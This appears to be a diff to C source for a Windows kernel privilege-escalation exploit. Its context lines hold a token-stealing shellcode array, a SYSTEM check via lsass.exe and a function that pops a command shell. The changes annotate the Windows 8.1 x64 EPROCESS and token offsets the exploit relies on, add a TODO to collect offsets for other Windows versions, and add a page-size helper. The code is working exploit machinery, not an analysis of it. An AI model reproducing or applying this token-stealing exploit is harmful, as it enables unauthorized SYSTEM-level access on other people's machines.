@@ -11,6 +11,8 @@
 #include <tlhelp32.h>
 #include <tchar.h>
 
+#pragma comment(lib, "user32.lib")
+
 #define SYSTEM_PROCESS_NAME "lsass.exe"
 
 BOOL DebugMode = FALSE;
@@ -141,7 +143,7 @@ BOOL CheckIsSystem()
 
         dwCrssPid = GetProcessIdByName(SYSTEM_PROCESS_NAME);
         if (dwCrssPid==-1){
-                err("GetProcessIdByName failed");
+                perr("GetProcessIdByName failed");
                 return FALSE;
         }
 
@@ -194,13 +196,15 @@ void PopupCmd()
 #ifdef __WIN81__
 
 #ifdef __X86_64__
-#define KIINITIAL_THREAD  "\x88\x01"
-#define EPROCESS_OFFSET   "\xb8\x00"
-#define PROCESSID_OFFSET  "\xe0\x02"
-#define FLINK_OFFSET      "\xe8\x02"
-#define TOKEN_OFFSET      "\x48\x03"
+#define KIINITIAL_THREAD  "\x88\x01"  // 0x0188
+#define EPROCESS_OFFSET   "\xb8\x00"  // 0x00b8
+#define PROCESSID_OFFSET  "\xe0\x02"  // 0x02e0
+#define FLINK_OFFSET      "\xe8\x02"  // 0x02e8
+#define TOKEN_OFFSET      "\x48\x03"  // 0x0348
 #define SYSTEM_PID        "\x04"
 #endif
+
+// TODO: get more offsets from others Windows versions
 
 #endif
 
@@ -232,3 +236,14 @@ const char StealTokenShellcode[] = ""
         "";
 
 #define StealTokenShellcodeLength sizeof(StealTokenShellcode)
+
+
+/**
+ * System info
+ */
+DWORD GetPageSize()
+{
+        SYSTEM_INFO siSysInfo;
+        GetSystemInfo(&siSysInfo);
+        return siSysInfo.dwPageSize;
+}
